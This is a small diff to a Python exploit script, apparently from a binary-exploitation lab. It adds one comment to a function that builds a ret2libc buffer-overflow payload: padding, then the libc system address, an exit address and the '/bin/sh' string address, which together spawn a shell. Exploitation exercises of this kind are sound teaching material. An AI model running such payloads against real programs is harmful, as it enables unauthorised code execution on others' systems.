@@ -34,6 +34,7 @@ def get_arg() -> bytes:
     addr_libc_bin_sh = addresses.address_to_bytes(addresses.LIBC_BIN_SH)
     patched_ret_addr_libc_system = addresses.address_to_bytes(addresses.EXIT)
     addr_libc_system = addresses.address_to_bytes(addresses.SYSTEM)
+    # padding then system with /bin/sh then clean exit with exit and the EXIT_CODE
     encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1') + addr_libc_system + patched_ret_addr_libc_system + addr_libc_bin_sh + patched_ret_addr_libc_exit
     return encoded_payload
 
